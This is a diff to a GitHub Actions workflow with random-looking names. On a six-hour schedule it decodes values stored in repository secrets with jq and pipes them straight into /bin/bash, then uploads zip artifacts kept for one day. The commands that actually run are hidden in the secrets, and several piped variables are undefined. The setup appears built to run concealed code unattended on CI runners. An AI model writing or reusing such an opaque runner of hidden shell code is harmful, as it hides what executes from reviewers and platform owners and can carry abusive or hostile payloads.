@@ -1,23 +1,26 @@
 name: zhuhougongshun
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '35 3/6 * * *'
-jobs:  # 29449
+    - cron: '44 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhuhougongshun
         env:
-          rnhy0: ${{ secrets.rnhy0 }}
+          mmri91872: ${{ secrets.mmri91872 }}
         run: |
-          echo $rnhy0 | jq -r .soxq5169 | /bin/bash
-          echo $yuf46 | jq -r .ix03546 | /bin/bash
-          echo $neu6 | jq -r .iv12666 | /bin/bash
-          echo $u218 | jq -r .qjyc034 | /bin/bash
-          echo $jigso6964 | jq -r .oxpaz013 | /bin/bash
-          echo $bd51865 | jq -r .jb1 | /bin/bash
-          echo $uvvr993 | jq -r .yivd2 | /bin/bash
+          printf '%s' "$mmri91872" | jq -r .qus699 | /bin/bash
+          printf '%s' "$rpl7156" | jq -r .tjj4 | /bin/bash
+          printf '%s' "$zm7837" | jq -r .jkjib12 | /bin/bash
+          echo $ukip5284 | jq -r .ipf3717 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: XxjmLBSf
+          path: "*.zip"
+          retention-days: 1
